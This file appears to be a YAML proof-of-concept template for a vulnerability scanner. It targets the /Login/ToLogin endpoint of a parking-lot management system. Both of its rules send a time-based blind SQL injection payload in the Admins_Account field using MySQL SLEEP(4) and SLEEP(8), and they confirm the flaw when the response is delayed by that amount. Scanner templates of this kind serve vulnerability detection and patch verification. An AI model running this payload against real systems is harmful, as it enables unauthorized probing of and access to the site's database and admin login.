name: poc-yaml-tingchechang-ToLogin-sql
transport: http


rules:
  r0:
    request:
      method: POST
      path: /Login/ToLogin
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: |
       Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(4)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
    expression: response.latency >= 4000 && response.latency <= 5000
  r1:
    request:
      method: POST
      path: /Login/ToLogin
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: |
       Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(8)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
    expression: response.latency >= 8000 && response.latency <= 9000
expression: r0() && r1()

